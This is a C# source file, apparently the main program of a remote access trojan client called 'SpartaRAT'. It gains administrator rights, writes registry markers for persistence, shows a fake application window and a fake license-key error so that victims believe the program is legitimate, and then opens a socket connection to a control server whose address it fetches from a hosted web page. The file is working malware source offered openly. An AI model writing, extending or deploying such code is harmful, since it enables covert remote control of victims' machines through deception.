using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Setup.PrivilegeCheck;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SpartaRATclient.Setup.OSType;
using SpartaRATclient;

namespace RATclientSparta
{
    public class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            StartProgram();
            void StartProgram()
            {
                //creates registry value for App opening date and OS type
                //starts fake GUI app if first time program opened
                Run.ProgramSetup();

                //creates an instance of SocketClient class which trigger constructor
                SocketServer SocketClient = new SocketServer();

                //SocketClient instance connecting to server (ipaddress comes from https://mysimpleweb054.000webhostapp.com/mysite/detail)
                SocketClient.Connect();
            }
        }

        public class Run
        {
            public static void ProgramSetup()
            {
                //Notice: This program registry path is HKEY_CURRENT_USER\Software\ClientValues
                //ClientValues - The registry key of this app

                //Registry check if item exist
                RegistryCheck item = new RegistryCheck();

                if (!(item.CheckIfExist("HaveTaskSchedulerItem")))
                {
                    //The only way for this data to be exist is if this program was already opened.
                    //So, if this already exist then the program already runned once.
                    //THIS IS A IF FOR THE FIRST TIME PROGRAM OPENED UNTIL TASK SCHEDULER ITEM CREATED
                    //The value "HaveTaskSchedulerItem" created only after task scheduler item created.

                    if (!(item.CheckIfExist("HaveAdminPrivilege")))
                    {
                        //Class name - GetPrivilege
                        AdminGet app = new AdminGet();
                        if (app.GetAdmin())
                        {
                            RegistryCreate data = new RegistryCreate();
                            data.Create("OpenedAt", DateTime.Now.ToString());
                            OSType OS = new OSType();
                            data.Create("OsVersion", OS.Type());

                            //When program gets privileges it will reopen as admin
                            //So i am closing this app because there is other app opened as admin
                            //I dont want this if to be run next time this program self opening it self, so I'm creating this value
                            data.Create("HaveAdminPrivilege", "");
                            Environment.Exit(0);
                        }
                        else
                        {
                            MessageBox.Show("Error: You must run this app as Administrator.");
                            Environment.Exit(0);
                        }
                    }
                    else
                    {
                        RegistryDelete value = new RegistryDelete();
                        value.DeleteValue("HaveAdminPrivilege");
                    }


                    //If "FirstOpen" registry data not exist, its the first time program opened.
                    //the Fake GUI will open, only once in life.
                    if (!(item.CheckIfExist("FirstOpen")))
                    {
                        //At the first open a GUI box will be shown because i want
                        //Clients to think this is a legit app
                        RegistryCreate value = new RegistryCreate();
                        value.Create("FirstOpen", "0");
                        GUIApp application = new GUIApp();
                        new Thread(new ThreadStart(() => { application.ShowDialog(); })).Start();
                    }
                    else
                    {
                        //User opened the program again, at this point he will keep thinking app is legit. (Fake error message)
                        MessageBox.Show("Error: please enter the key to use this program." + Environment.NewLine + "Error ID: 45771 (No key entered)");
                    }
                }
            }
        }
    }
}
